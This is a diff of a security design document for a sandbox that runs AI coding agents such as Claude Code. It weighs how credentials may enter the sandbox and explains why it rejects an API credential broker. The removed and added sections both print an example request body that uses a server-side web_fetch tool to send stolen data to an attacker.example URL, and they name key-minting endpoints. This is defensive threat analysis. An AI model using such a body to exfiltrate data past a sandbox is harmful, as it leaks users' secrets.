@@ -12,7 +12,7 @@ The distinction is not bookkeeping. An **[M-prior]** line is one nobody has run
 against this tree, so it can be false here with nothing in the document showing
 it.
 
-There is no single mechanism. There are four, a test that picks one, and a list
+There is no single mechanism. There are three, a test that picks one, and a list
 of shapes that are refused with the measurement that refused them. §7 is not an
 appendix: a refusal without its measurement gets re-proposed within a quarter.
 
@@ -33,10 +33,11 @@ appendix: a refusal without its measurement gets re-proposed within a quarter.
 > profile's TOML carries its abuse sentence and its blast radius. `--dry-run`
 > names every secret the run places inside, and where.
 >
-> **A broker answers from what the policy pinned, not by filtering what the host
-> offers.** The sandbox can neither enumerate what else exists nor request it.
-> Where snug cannot broker and must place a secret inside, it places the smallest
-> form that works, and the profile states what that form still grants.
+> **A mediator answers from what the policy pinned, not by filtering what the
+> host offers.** `internal/sshproxy` is the one that ships. The sandbox can
+> neither enumerate what else exists nor request it. Where snug cannot mediate
+> and must place a secret inside, it places the smallest form that works, and the
+> profile states what that form still grants.
 
 Two clauses that are definitional rather than structural, and are therefore not
 exceptions:
@@ -46,7 +47,7 @@ exceptions:
 > loud, the rule appears to forbid `known_hosts`, the pinned `.gitconfig`'s
 > `user.email` and `hosts.yml`'s account name.
 
-> *A broker stays small, snug's own, and reviewable — **never a user-supplied
+> *A mediator stays small, snug's own, and reviewable — **never a user-supplied
 > script, and never a host command whose arguments the sandbox chose**.*
 
 And the closing rule, because it is the failure mode this area actually has:
@@ -68,7 +69,7 @@ Four axes, ordered by how much each should move the verdict.
 
 **A2 true → never inject, regardless of how narrow A3 looks.** A refresh token,
 an SSH-key-minting scope and a token that can create another token are the same
-row. Every mechanism in §3 is an answer to A1 and A2; only §3.3 answers A3.
+row. Every mechanism in §3 is an answer to A1 and A2; only §3.2 answers A3.
 
 ---
 
@@ -106,7 +107,7 @@ have nothing to do, and the host's own helper is not inherited.
 
 ---
 
-## 3. The four mechanisms
+## 3. The three mechanisms
 
 Each carries its abuse sentence — the thing a hostile process inside can do with
 it — because a mechanism without one has not been thought about.
@@ -117,166 +118,7 @@ it — because a mechanism without one has not been thought about.
 floor. The interesting question is never whether this should be the default but
 what the smallest departure from it is that makes the tool work.
 
-### 3.1 The broker — the tool's own protocol over a socket snug owns
-
-snug holds the credential on the host, speaks the tool's protocol, and the
-sandbox points at it with the tool's own configuration knob.
-
-**Abuse:** *a hostile process can issue, with your full identity, any request the
-allowlist permits, with a body it chose, for the sandbox's lifetime. It cannot
-read the credential and cannot use the account afterwards. Whether it can make
-data leave the machine depends on what the vendor will do with a body snug does
-not inspect — see §3.1.1, which is why "cannot reach an endpoint outside the
-allowlist" is NOT part of this sentence.*
-
-**The transport is an AF_UNIX socket and needs no network grant. [M]** Claude Code
-honours `ANTHROPIC_UNIX_SOCKET=<path>`, which selects undici's `{unix: path}`
-dispatcher for Anthropic API requests only **[R]**. Measured against a mock API
-inside `bwrap --unshare-net`, with **no credential file present at all**:
-
-| arm | result |
-|---|---|
-| headless `claude -p`, no network, socket only | completes, prints the answer, exit 0 |
-| interactive on a real pty, no network, socket only | starts, renders, completes a turn |
-| `/status` · `/model` · `/usage` | **no API call at all** |
-| the whole endpoint set, every arm | `POST /v1/messages?beta=true` |
-
-The two POSTs per turn are two *models* — `/usage` attributes them to
-`claude-haiku-4-5` and `claude-sonnet-5` — not two endpoints. So the allowlist is
-**one rule**. The sandbox carries a placeholder snug wrote (`ANTHROPIC_API_KEY`
-arrives as `x-api-key`, `ANTHROPIC_AUTH_TOKEN` as `Authorization: Bearer`) and the
-host side replaces it. OAuth credentials are ignored in this mode: its refusal is
-`Not logged in · Please run /login`. Upstream treats it as a supported shape —
-`ANTHROPIC_UNIX_SOCKET`, `CLAUDE_CODE_PROVIDER_MANAGED_BY_HOST` and
-`CLAUDE_CODE_HOST_AUTH_ENV_VAR` are one predicate, and the bundle's own string is
-*"the local proxy is API-key-authed"* **[R]**.
-
-Four things a broker must get right, each measured rather than reasoned:
-
-- **`http://` scheme.** TLS over the socket **hangs** rather than erroring.
-- **Absolute-form request lines.** With `HTTPS_PROXY` in the environment the
-  client sends `POST http://api.anthropic.com/v1/messages?beta=true`. Match the
-  parsed path, or a user with a proxy in their shell gets a 404 for the session.
-- **Refusals must be 4xx.** A 500 is retried seven times in ~55 s.
-- **`ANTHROPIC_BASE_URL` becomes snug-authored, not inherited.** Inheriting it
-  lets a host gateway setting disable the broker silently — invariant 5.
-
-#### 3.1.1 The allowlist is default-deny, and "one rule" was a sizing measurement
-
-**"The whole endpoint set is one path" is a measurement of what the CLIENT sends.
-It is not a safety property, and reading it as one is the mistake this section
-exists to stop.** The attacker is not `claude`: the payload speaks raw HTTP to the
-socket and picks its own path. Measured **[M]**: inside `bwrap --unshare-net`,
-with `curl` to `1.1.1.1` returning exit 7 as the negative control, a plain `sh`
-plus `curl --unix-socket` reached the socket and had a request of its choosing
-forwarded.
-
-So the broker is **default-deny on the path**, and the paths it must refuse are
-named rather than left to the default: `/api/oauth/claude_cli/create_api_key`,
-`/api/oauth/claude_cli/roles`, `/api/oauth/cri` **[R]**. A broker that attaches
-the real credential to whatever path arrives is a **durable-key-minting oracle
-reachable from a sandbox with no network grant**, which is strictly worse than
-injecting a token that expires in hours. Any prototype that forwards
-`self.path` verbatim has this shape.
-
-And the path is only the first surface. The second one is the body:
-
-The endpoint is not the exfiltration surface; the **body** is. A payload does not
-have to use the tool the broker was built for — it has a shell, and the broker's
-address. It writes its own request naming a **server-side** tool, one the vendor's
-own machines execute against a URL the body chose:
-
-```
-POST /v1/messages   { "messages": [{"role":"user","content":"https://attacker.example/?d=<stolen>"}],
-                      "tools": [{"type":"web_fetch_20250910","name":"web_fetch"}] }
-```
-
-That matches a `(method, path)` allowlist exactly, so snug forwards it, and the
-data leaves a sandbox with no route off the box. **The client half is measured
-[M]**: inside `bwrap --unshare-net` — negative control `curl` to `1.1.1.1`
-returning exit 7, no route — a plain `sh` plus `curl --unix-socket` reached the
-allowlisted endpoint with exactly the body above, and a `(method, path)` allowlist
-accepted it. No agent involved: the tool the broker was built for is not the
-attacker. Two facts bound how bad this is,
-and one question decides it:
-
-- **Refusing server tools would not break the client. [M-prior]** Claude Code's
-  own substantive turn carries 25 tool blocks and **not one of them has a `type`
-  field** — its `WebFetch`/`WebSearch` are client-side tools it executes itself.
-  So the filter is one key at one depth: *refuse any element of `tools[]` carrying
-  a `type`*. It is not free — it means decoding a ~187 KB body per turn and
-  inheriting the whole "two parsers disagree about a spelling" escape class that
-  `(method, path)` was chosen to avoid, including the anti-rot shape that asks
-  `encoding/json` whether it accepts a spelling snug rejects.
-- **`web_fetch`'s own anti-exfiltration control does not bind this attacker
-  [R]:** it may only fetch URLs that already appeared in the conversation, and
-  the payload writes the conversation.
-- **UNRESOLVED: does this credential permit server-side tools at all?** Settling
-  it needs one real request to the vendor with a live credential, which no
-  measurement in this project spends without the owner's explicit consent. The
-  safe experiment is one `POST /v1/messages` carrying
-  `tools: [{"type":"web_fetch_20250910","name":"web_fetch"}]` and a user message
-  naming a URL on a listener the owner controls, recording **separately** whether
-  the API rejects the block and whether the listener is hit.
-
-**Until that is answered the broker is not buildable as one rule.** If server
-tools are refused for the credential, the broker is smaller than
-`internal/sshproxy` and has no body decode. If they are permitted, it needs the
-body filter above — and the honest zero-code alternative is to say plainly that
-`@claude` either runs offline and does not work, or runs with `@net` and the token
-is inside.
-
-#### 3.1.2 Where the broker runs, which is settled
-
-- **Host side: a goroutine in P0 serving a unix socket**, bind-mounted in through
-  `Policy.BindSocket` (`internal/policy/types.go:659`), exactly as the identity
-  and container sockets already are. Not a third process: `setns(CLONE_NEWNET)`
-  from P0 returns **EPERM [M-prior]**, and the conclusion once drawn from that —
-  that the broker forces the stage topology onto `@claude`, giving the profile
-  most likely to be running hostile input a `CAP_SYS_ADMIN` ancestor for the whole
-  run — does not follow. **With `ANTHROPIC_UNIX_SOCKET` no part of the broker is
-  in the sandbox's netns at all:** a pathname AF_UNIX socket is a filesystem
-  object, not a netns object, so the listener sits in P0 in the host netns and
-  reaches the sandbox as a bind mount. The netns question arises only for the
-  *fallback relay* below, which must be in the sandbox's netns and carries no
-  credential.
-- **No `deriveTopology` change, no new lattice point, no `CAP_SYS_ADMIN`
-  ancestor** — `internal/cli/identity.go:169-177` is the shipped precedent at the
-  same topology: `sshproxy.New` (which listens and `chmod`s `0600` before
-  returning), `go p.Serve()` in P0, then `pol.BindSocket`.
-- **The broker is an egress hole in a sandbox whose screen says there is none,
-  and the screen must say so.** `internal/cli/dryrun.go`'s `NetIsolated` arm
-  prints "No egress. No host loopback." A mediated route off the box exists for a
-  run with no `@net`; §3.1.1's body-exfiltration analysis is the sharp end of it,
-  but `describeNetwork` needs a broker clause the way it grew `renderHTTPDoors`
-  after issue #541, or three renderings of one policy disagree again. This is the
-  `ENGINE-NETNS.md` §0 shape: a limitation and a hole are the same fact facing two
-  directions. A two-turn tool loop completed behind a one-rule allowlist inside
-  `bwrap --unshare-net`, with an empty routing table, dead DNS and
-  `connect: Network is unreachable` to `1.1.1.1:443` as printed negative controls
-  **[M-prior]**.
-- **`ANTHROPIC_UNIX_SOCKET` removes the in-sandbox forwarder entirely**, and with
-  it four costs: an extra process as the payload's
-  parent, snug wrapping the payload argv (which interacts with `snug shell`), an
-  availability regression if the payload kills it, and a second executable in
-  `StagedBinDir`. The forwarder exists only because `ANTHROPIC_BASE_URL` must be
-  an `http://host:port` URL — and the socket variable is the vendor's own answer
-  to that. The forwarder stays in the design for tools that have **no** socket
-  knob (below), never for this one.
-
-**A tool with no unix-socket option is still reachable with no network grant.
-[M]** Loopback is up inside an unshared netns with no `pasta`
-(`bwrap --unshare-net` → `lo inet 127.0.0.1/8`; bind and connect both succeed), so
-a snug-authored relay inside the sandbox carries `127.0.0.1:<port>` to the bound
-socket. No `-T <port>` host-loopback splice, no DNS, no CA. The relay is
-transport, not a boundary (§5.1).
-
-**Where it suits:** any tool with a base-URL or socket knob and an allowlist
-expressible in a handful of `(method, path, host)` rules. Anthropic is the best
-case in the list. **The deciding rule:** *if the allowlist cannot be written in a
-handful of rules, the tool does not want a broker — it wants §3.3.*
-
-### 3.2 The agent proxy — the credential stays in something that already speaks a protocol
+### 3.1 The agent proxy — the credential stays in something that already speaks a protocol
 
 `internal/sshproxy` is the shipped instance and the calibration point for every
 other hole: A1 false, A2 false, the filter reviewable in an afternoon.
@@ -288,7 +130,7 @@ cannot sign after the sandbox exits.*
 It does not generalise, because nothing else ships an agent. `gpg-agent` is the
 one other candidate (commit signing, `pass`).
 
-### 3.3 A smaller credential, issued by the vendor
+### 3.2 A smaller credential, issued by the vendor
 
 The human — or snug — obtains a credential narrow enough that holding it is
 tolerable: a GitHub App installation token (one hour, repository- and
@@ -311,7 +153,7 @@ there is no minting to do at all.
 > **If you cannot bound the authority, do not accept the credential — get a
 > smaller one issued.**
 
-### 3.4 The wrapper — snug runs the tool, in a place the payload is not
+### 3.3 The wrapper — snug runs the tool, in a place the payload is not
 
 `/snug/bin/<tool>` (`policy.StagedBinDir`, `internal/policy/snugns.go:60`) is a
 snug-authored program on the sandbox's `PATH`. It does not hold the secret and it
@@ -357,10 +199,11 @@ Answer in order. The first "yes" wins.
 
 1. **Does the tool need a credential at all?** For `git`, no — §2. This is free
    and it is the answer more often than it looks.
-2. **Does the tool have a base-URL, socket or endpoint knob, and an allowlist of
-   a handful of `(method, path, host)` rules?** → **broker** (§3.1).
+2. **Does the tool already speak a protocol something on the host can answer?**
+   → **agent proxy** (§3.1). `internal/sshproxy` is the instance and the
+   calibration point; nothing else ships an agent, so this is rarely the answer.
 3. **Does the vendor issue something narrow, short-lived and unable to mint?** →
-   **smaller credential** (§3.3). Take it even when another mechanism also
+   **smaller credential** (§3.2). Take it even when another mechanism also
    applies: the mechanisms compose and this one survives our bugs.
 4. **Otherwise, is the tool one snug can run on the payload's behalf, and does it
    satisfy all three of:**
@@ -369,7 +212,7 @@ Answer in order. The first "yes" wins.
    - **no repository as input** (§7.1);
    - no persistent state written where a later invocation reads it?
 
-   → **wrapper** (§3.4).
+   → **wrapper** (§3.3).
 5. **Otherwise the tool has no credentials inside, and snug says so.** That is
    the correct degradation: visible, annoying, harmless.
 
@@ -392,7 +235,7 @@ What replaces the mechanism is a **bar**, because YAGNI stops a general mechanis
 and does nothing to stop one-off adapters accreting, each individually justified:
 
 1. Can the tool's credential handling be expressed in a handful of rules a human
-   can read and verify? If not, it gets §3.3 and no code.
+   can read and verify? If not, it gets §3.2 and no code.
 2. Is the tool's config format one the vendor will change under us? Cost accepted
    only where the alternative is a leak.
 3. The failure mode of a broken adapter is a hard, visible error — never a
@@ -400,13 +243,13 @@ and does nothing to stop one-off adapters accreting, each individually justified
 
 **Profiles are already the extension point.** Anyone can write one in
 `profiles.d` and stage their own credential with their own abuse sentence, no
-snug code. What they cannot do is *broker*, and brokering is the part that needs
-snug involved at all.
+snug code. What they cannot do is put snug's own code between the payload and a
+credential, and that mediation is the part that needs snug involved at all.
 
 ### 4.2 A secret selector must not be steerable by the target
 
 Wherever a profile names *which* secret to use — an identity key, a credential
-source, a broker's account — that name must not be expandable from `{…}`
+source, a wrapper's account — that name must not be expandable from `{…}`
 variables the sandbox can influence. The repository is the material being
 sandboxed; letting it choose the identity the sandbox acts under is the same
 class of defect as letting it choose the credential, and invariant 3 is the same
@@ -526,7 +369,7 @@ control channel becomes a path the payload controls, which §5.4 already refuses
 under "no path-typed field crosses the boundary".
 
 **Four — the implementation route either invents a re-exec verb or hands
-`@claude` the ancestor §3.1.2 exists to avoid.** The payload's user namespace is
+`@claude` the ancestor §7.9 declines.** The payload's user namespace is
 always a *descendant* of one snug already made that maps exactly **one** id:
 flat path `internal/sandbox/exec.go:443` clones NP with
 `UidMappings{ContainerID: 0, HostID: os.Getuid(), Size: 1}`; staged path
@@ -542,7 +385,7 @@ effect**: `NeedsStage()` is `t.Netns >= NetnsStage || t.Subuid >= SubuidFull`
 (`internal/policy/topology.go:130`), whose own comment keeps the disjunct so
 "a future producer of SubuidFull must not silently lose its stage". A second
 producer therefore gives the profile most likely to be running hostile input the
-privileged ancestor §3.1.2 declines, and instantiates `{NetnsSandbox,
+privileged ancestor §7.9 declines, and instantiates `{NetnsSandbox,
 SubuidFull}` — the combination that comment says "never decides the answer for
 anything Resolve produces", i.e. an untested arm of `runStaged`.
 
@@ -563,7 +406,7 @@ that must share the payload's *mount* or *net* namespace, and nothing specified
 here does: `internal/sshproxy` and the container proxy already hold their
 credentials in **P0**, unaddressable from the payload by construction
 (`internal/cli/identity.go:177` is the shape — `sshproxy.New`, `go p.Serve()`,
-`pol.BindSocket`), and §3.4's sibling sandbox covers "run the vendor's binary"
+`pol.BindSocket`), and §3.3's sibling sandbox covers "run the vendor's binary"
 with its own mount, pid and net namespaces. **NP is not a third option for a
 third-party binary:** it maps uid 0 to the human's host uid, so a process left
 there carries the human's full host DAC — strictly more authority than P0.
@@ -723,31 +566,19 @@ interpreter ran is not a negative result.
 `insteadOf` plus the ssh-agent proxy. Do not build a git credential helper: it
 would be a mechanism for handing the payload something it currently cannot get.
 
-### 6.2 Claude Code — broker (§3.1)
+### 6.2 Claude Code — the projected credential
 
-`ANTHROPIC_UNIX_SOCKET`, one endpoint, no network grant, no credential inside.
-The host side re-reads the host credential per request, so a refresh the human's
-own `claude` performs is picked up mid-run.
+The credential inside is one snug generated: `internal/policy/claudecreds.go`
+projects the host's `~/.claude/.credentials.json` onto five allowlisted fields
+inside `claudeAiOauth`, drops the `refreshToken` half, and drops a field that
+appears upstream tomorrow rather than carrying it. There is no mediator between
+the payload and the API, and §7.9 is why.
 
-Two frictions it must answer, both measured:
-
-- **The API-key approval dialog.** Interactive startup blocks on *"Detected a
-  custom API key in your environment … Do you want to use this API key?"*,
-  defaulting to **No**. Headless never asks. This is the trust-dialog problem
-  again and it has the same shape of answer — a key in the generated
-  `~/.claude.json`, or `ANTHROPIC_AUTH_TOKEN`, or
-  `CLAUDE_CODE_HOST_AUTH_ENV_VAR`, which exists for precisely this. Whichever is
-  chosen, snug is answering a security question on the human's behalf and
-  `--dry-run` says so in those words.
-- **Enterprise policy fails open.** `⚠ Remote managed settings failed to load ·
-  no remote policy applied`. The fetch is `api.anthropic.com/api/claude_code/settings`
-  **[R]**, not an `ANTHROPIC_BASE_URL` call, so the socket does not carry it. An
-  organisation believing its policy applies inside the sandbox would be believing
-  a guarantee that does not hold.
-
-Until the broker lands, the projected credential (`claudecreds.go`) is what
-enters: five allowlisted fields, no refresh half, and a field that appears
-upstream tomorrow is dropped rather than carried.
+**Enterprise policy fails open with no `@net`.** `⚠ Remote managed settings
+failed to load · no remote policy applied`. The fetch is
+`api.anthropic.com/api/claude_code/settings` **[R]**, so a run with no egress
+never makes it, and an organisation believing its policy applies inside such a
+sandbox would be believing a guarantee that does not hold.
 
 Two facts that bound what is inside today, and both are cited from elsewhere in
 the design:
@@ -805,7 +636,7 @@ Tools: **WebSearch rides the socket** (it is a server tool, executed inside the
 `/v1/messages` call **[R]**). **WebFetch needs egress** — client-side HTTP to an
 arbitrary host. stdio MCP servers need nothing; `http`/`sse` ones need egress.
 
-### 6.3 gh — a smaller credential (§3.3), not a broker and not a wrapper
+### 6.3 gh — a smaller credential (§3.2), not a mediator and not a wrapper
 
 Three measurements, all this pass:
 
@@ -818,11 +649,11 @@ HTTPS_PROXY=http://127.0.0.1:<port> gh api /user
 ```
 
 `gh` forces HTTPS even for a loopback host, and treats a non-`github.com` host as
-Enterprise — the path becomes `/api/v3/user`. A broker impersonating `github.com`
-must *be* `github.com`: a per-run CA, a leaf and `SSL_CERT_FILE`. And `gh` honours
-`HTTPS_PROXY` with `CONNECT`, which is the trap — a CONNECT tunnel is end-to-end
-TLS, so such a proxy pins the host and injects **nothing**. It is an egress bound,
-never a credential broker.
+Enterprise — the path becomes `/api/v3/user`. Anything impersonating
+`github.com` must *be* `github.com`: a per-run CA, a leaf and `SSL_CERT_FILE`.
+And `gh` honours `HTTPS_PROXY` with `CONNECT`, which is the trap — a CONNECT
+tunnel is end-to-end TLS, so such a proxy pins the host and injects **nothing**.
+It is an egress bound, never a credential mediator.
 
 The wrapper fails it too, on §7.1 rather than on argv. So: an App installation
 token, a repo-scoped token the CI already holds, or a token snug mints and
@@ -934,7 +765,7 @@ one.
 
 Where a stub is nonetheless built, it must not be named after the tool: a
 verb-subset stub called `gh` is a lie an agent acts on, assuming the full surface
-and burning turns on flags that silently do not exist. §3.4's faithful
+and burning turns on flags that silently do not exist. §3.3's faithful
 pass-through is exempt because it is not a subset.
 
 ### 7.5 systemd credentials (`$CREDENTIALS_DIRECTORY`)
@@ -1002,6 +833,104 @@ processes snug starts, and §5.2 refuses that route on four separate grounds —
 the answer is that nothing needing caller authentication runs inside the payload's
 namespaces at all.
 
+### 7.9 A credential broker for the Anthropic API
+
+**snug does not build one.** The projected credential (§6.2) is what enters, and
+this section holds the measurements that decided it, because a refusal without
+its measurement gets re-proposed within a quarter.
+
+The shape refused: snug holds the credential in P0, speaks the tool's own
+protocol over an AF_UNIX socket, and the sandbox points at it with the tool's own
+configuration knob. The abuse sentence it would have carried is where it dies —
+*a hostile process can issue, with your full identity, any request the allowlist
+permits, **with a body it chose**, for the sandbox's lifetime.*
+
+**The transport works and is not the problem. [M]** Claude Code honours
+`ANTHROPIC_UNIX_SOCKET=<path>`, which selects undici's `{unix: path}` dispatcher
+for Anthropic API requests only **[R]**. Measured against a mock API inside
+`bwrap --unshare-net`, with **no credential file present at all**:
+
+| arm | result |
+|---|---|
+| headless `claude -p`, no network, socket only | completes, prints the answer, exit 0 |
+| interactive on a real pty, no network, socket only | starts, renders, completes a turn |
+| `/status` · `/model` · `/usage` | **no API call at all** |
+| the whole endpoint set, every arm | `POST /v1/messages?beta=true` |
+
+The two POSTs per turn are two *models* — `/usage` attributes them to
+`claude-haiku-4-5` and `claude-sonnet-5` — not two endpoints, so an allowlist
+sized against the client is **one rule**. Four things such a socket must get
+right, each measured: TLS over it **hangs** rather than erroring, so the scheme
+is `http://`; with `HTTPS_PROXY` in the environment the client sends
+absolute-form request lines (`POST http://api.anthropic.com/v1/messages?beta=true`);
+a 500 is retried seven times in ~55 s, so refusals must be 4xx; and
+`ANTHROPIC_BASE_URL` would have to be snug-authored rather than inherited,
+because a host gateway setting that disables the mediator silently is
+invariant 5.
+
+**"One rule" is a measurement of what the CLIENT sends. It is not a safety
+property, and the attacker is not `claude`.** Measured **[M]**: inside
+`bwrap --unshare-net`, with `curl` to `1.1.1.1` returning exit 7 as the negative
+control, a plain `sh` plus `curl --unix-socket` reached the socket and had a
+request of its own choosing forwarded. Two consequences, and the second is the
+refusal:
+
+- **A path allowlist must be default-deny and must name what it refuses** —
+  `/api/oauth/claude_cli/create_api_key`, `/api/oauth/claude_cli/roles`,
+  `/api/oauth/cri` **[R]**. Attaching the real credential to whatever path
+  arrives is a **durable-key-minting oracle reachable from a sandbox with no
+  network grant**, strictly worse than injecting a token that expires in hours.
+  Any prototype that forwards `self.path` verbatim has this shape.
+- **The endpoint is not the exfiltration surface; the body is.** A payload writes
+  its own request naming a **server-side** tool — one the vendor's machines
+  execute against a URL the body chose:
+
+  ```
+  POST /v1/messages   { "messages": [{"role":"user","content":"https://attacker.example/?d=<stolen>"}],
+                        "tools": [{"type":"web_fetch_20250910","name":"web_fetch"}] }
+  ```
+
+  That matches a `(method, path)` allowlist exactly. Measured **[M]** with the
+  same `curl --unix-socket` arm and the same exit-7 negative control: the body
+  above reached the allowlisted endpoint and a `(method, path)` allowlist
+  accepted it. `web_fetch`'s own anti-exfiltration control does not bind this
+  attacker **[R]** — it may only fetch URLs that already appeared in the
+  conversation, and the payload writes the conversation.
+
+**Whether the vendor would execute that body is unresolved, and stays
+unresolved.** Settling it needs one real `POST /v1/messages` to
+`api.anthropic.com` with a live credential, and no measurement in this project
+spends a credential its owner did not choose to spend. So the mediator cannot be
+scoped: either it is a `(method, path)` rule that may be forwarding an
+exfiltration primitive, or it decodes the body. **Decoding is measured to be the
+larger surface. [M-prior]** Claude Code's substantive turn carries 25 tool blocks
+and **not one has a `type` key**, so refusing server tools would not break the
+client and the filter is one key at one depth — but it means decoding a ~187 KB
+JSON body per turn and inheriting the whole `dockerproxy` "two parsers disagree
+about a spelling" escape class that `(method, path)` was chosen to avoid,
+including the anti-rot shape that asks `encoding/json` itself whether it accepts
+a spelling snug rejects. A larger and less reviewable surface than the projection
+it would replace, bought with a measurement that cannot be taken: the trade does
+not clear, and the honest alternative is the one that ships — `@claude` runs with
+the projected token inside, for the hours it lasts.
+
+**Two facts kept because other sections rest on them.** A pathname AF_UNIX socket
+is a filesystem object, not a netns object, so a host-side listener needs no
+`deriveTopology` change, no new lattice point and no `CAP_SYS_ADMIN` ancestor —
+`internal/cli/identity.go` is the shipped precedent at that topology
+(`sshproxy.New`, `go p.Serve()`, then `pol.BindSocket`), and §5.2 declines the
+privileged ancestor the alternative would force onto the profile most likely to
+be running hostile input. And **[M]** loopback is up inside an unshared netns
+with no `pasta` (`bwrap --unshare-net` → `lo inet 127.0.0.1/8`, bind and connect
+both succeed), so "no network grant" has never meant "no in-sandbox transport".
+
+**If this is ever reopened, `--dry-run` moves first.** `internal/cli/dryrun.go`'s
+`NetIsolated` arm prints *"No egress. No host loopback. No abstract unix sockets
+(netns-scoped)."* A mediated route off the box makes the first sentence false,
+and `describeNetwork` must say so in the same change that opens it, beside
+`renderHTTPDoors` — otherwise the screen, the policy and the run disagree about
+one fact.
+
 ---
 
 ## 8. What none of this protects
@@ -1040,12 +969,12 @@ namespaces at all.
   enumeration of the shared surface written over `p.Mounts` cannot see it: a
   `KindGraft` in `p.Mounts` is refused by `internal/policy/validate.go`, so the
   store lives in `p.Grafts` and a mount-set sweep is blind to it by construction.
-- **Intent.** A broker pins the identity and the operation set. It cannot pin what
-  the agent asks for within them, and quota theft while the run lasts is
+- **Intent.** A mediator pins the identity and the operation set. It cannot pin
+  what the agent asks for within them, and quota theft while the run lasts is
   unaffected.
 - **A body snug does not inspect.** An endpoint allowlist bounds *where* a request
-  goes, not what the vendor does on its behalf. §3.1.1 is the worked example and
-  it is unresolved, so no milestone may claim a broker closes exfiltration.
+  goes, not what the vendor does on its behalf. §7.9 is the worked example, and
+  it is why no endpoint allowlist may be claimed to close exfiltration.
 - **Anything the tool prints.** With stdio connected, everything the tool writes
   reaches the payload. The wrapper's value is that the secret's *file* is not in
   the payload's mount namespace and the process holding it is not in its pid
